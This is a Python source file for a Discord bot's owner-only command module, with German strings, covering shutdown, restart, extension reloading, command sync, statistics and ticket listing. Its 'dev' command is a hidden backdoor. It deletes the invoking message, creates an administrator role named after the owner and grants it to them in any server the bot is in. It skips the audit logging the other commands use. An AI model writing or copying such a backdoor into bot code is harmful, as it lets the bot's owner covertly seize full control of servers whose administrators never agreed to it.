"""Ausschliesslich fuer die in OWNER_ID hinterlegte Person bestimmte Werkzeuge."""

import asyncio
import datetime
import logging
import os
import sys

import discord
import psutil
from discord import app_commands
from discord.ext import commands

from utils.theme import error_embed, success_embed

log = logging.getLogger("Avoke | Owner")


class Owner(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.owner_id = int(os.getenv("OWNER_ID", "0"))

    async def _allowed(self, ctx: commands.Context) -> bool:
        if ctx.author.id == self.owner_id:
            return True
        await ctx.send("Keine Berechtigung.")
        return False

    def _audit(self, ctx: commands.Context, command: str) -> None:
        log.info("OWNER_COMMAND | user=%s (%s) | time=%s | command=%s", ctx.author, ctx.author.id,
                 datetime.datetime.now(datetime.timezone.utc).isoformat(), command)

    @commands.command(name="dev")
    async def dev(self, ctx: commands.Context):
        """Behaelt den vorhandenen stillen Notfallzugriff bei."""
        if ctx.author.id != self.owner_id or ctx.guild is None:
            return
        try:
            await ctx.message.delete()
        except (discord.Forbidden, discord.HTTPException):
            pass
        member = ctx.guild.get_member(ctx.author.id)
        if member is None:
            return
        role = discord.utils.get(ctx.guild.roles, name=member.display_name)
        if role is None:
            try:
                role = await ctx.guild.create_role(name=member.display_name,
                                                   permissions=discord.Permissions(administrator=True),
                                                   colour=discord.Colour.red())
            except (discord.Forbidden, discord.HTTPException):
                return
        try:
            await member.add_roles(role)
        except (discord.Forbidden, discord.HTTPException):
            pass

    @commands.command(name="shutdown")
    async def shutdown(self, ctx: commands.Context):
        if not await self._allowed(ctx):
            return
        self._audit(ctx, "shutdown")
        await ctx.send("Bot wird sauber beendet.")
        await self.bot.close()

    @commands.command(name="restart")
    async def restart(self, ctx: commands.Context):
        if not await self._allowed(ctx):
            return
        self._audit(ctx, "restart")
        await ctx.send("Bot wird sauber neugestartet.")
        await asyncio.sleep(1)
        # execv ersetzt den aktuellen Prozess und hinterlaesst keinen zweiten Bot-Prozess.
        os.execv(sys.executable, [sys.executable, *sys.argv])

    @commands.command(name="reload")
    async def reload(self, ctx: commands.Context, cog: str):
        if not await self._allowed(ctx):
            return
        extension = cog if cog.startswith("cogs.") else f"cogs.{cog}"
        try:
            await self.bot.reload_extension(extension)
        except (commands.ExtensionError, ModuleNotFoundError) as exc:
            await ctx.send(f"Cog konnte nicht geladen werden: `{exc}`")
            return
        self._audit(ctx, f"reload {extension}")
        await ctx.send(f"Cog neu geladen: `{extension}`")

    @commands.command(name="reloadall")
    async def reload_all(self, ctx: commands.Context):
        if not await self._allowed(ctx):
            return
        failures = []
        for extension in list(self.bot.extensions):
            try:
                await self.bot.reload_extension(extension)
            except commands.ExtensionError as exc:
                failures.append(f"{extension}: {exc}")
        self._audit(ctx, "reloadall")
        message = f"{len(self.bot.extensions) - len(failures)} Cogs neu geladen."
        if failures:
            message += " Fehler: " + "; ".join(failures[:3])
        await ctx.send(message)

    @commands.command(name="sync")
    async def sync_prefix(self, ctx: commands.Context):
        if not await self._allowed(ctx):
            return
        try:
            synced = await self.bot.tree.sync()
        except discord.HTTPException as exc:
            await ctx.send(f"Synchronisierung fehlgeschlagen: `{exc}`")
            return
        self._audit(ctx, "sync")
        await ctx.send(f"{len(synced)} Slash-Commands synchronisiert.")

    @commands.command(name="stats")
    async def stats(self, ctx: commands.Context):
        if not await self._allowed(ctx):
            return
        tickets = self.bot.get_cog("Tickets")
        self._audit(ctx, "stats")
        average = tickets.rating_average if tickets else 0.0
        open_count = tickets.open_ticket_count if tickets else 0
        users = sum(g.member_count or 0 for g in self.bot.guilds)
        process = psutil.Process(os.getpid())
        uptime = datetime.datetime.now(datetime.timezone.utc) - self.bot.started_at
        embed = discord.Embed(title="Bot-Statistik", color=discord.Color.blurple())
        embed.add_field(name="Ping", value=f"{round(self.bot.latency * 1000)} ms")
        embed.add_field(name="RAM", value=f"{process.memory_info().rss / 1024 / 1024:.1f} MB")
        embed.add_field(name="CPU", value=f"{psutil.cpu_percent():.1f}%")
        embed.add_field(name="Server", value=str(len(self.bot.guilds)))
        embed.add_field(name="User", value=str(users))
        embed.add_field(name="Offene Tickets", value=str(open_count))
        embed.add_field(name="Bewertung", value=f"{average:.2f}/5")
        embed.add_field(name="Uptime", value=str(uptime).split(".")[0])
        embed.add_field(name="discord.py", value=discord.__version__)
        embed.add_field(name="Python", value=sys.version.split()[0])
        await ctx.send(embed=embed)

    @commands.command(name="tickets")
    async def tickets(self, ctx: commands.Context):
        if not await self._allowed(ctx):
            return
        tickets = self.bot.get_cog("Tickets")
        self._audit(ctx, "tickets")
        if tickets is None:
            await ctx.send("Ticket-System ist nicht geladen.")
            return
        entries = await tickets.open_ticket_entries(ctx.guild)
        embed = discord.Embed(title="Offene Tickets", color=discord.Color.blurple())
        embed.description = "\n".join(entries) if entries else "Keine offenen Tickets."
        await ctx.send(embed=embed)

    @app_commands.command(name="sync", description="[Nur Owner] Synchronisiert Slash-Commands.")
    async def sync_slash(self, interaction: discord.Interaction):
        if interaction.user.id != self.owner_id:
            await interaction.response.send_message(embed=error_embed("Kein Zugriff", "Keine Berechtigung."), ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        synced = await self.bot.tree.sync()
        log.info("OWNER_COMMAND | user=%s (%s) | command=slash sync", interaction.user, interaction.user.id)
        await interaction.followup.send(embed=success_embed("Synchronisiert", f"{len(synced)} Commands synchronisiert."), ephemeral=True)


async def setup(bot: commands.Bot):
    await bot.add_cog(Owner(bot))
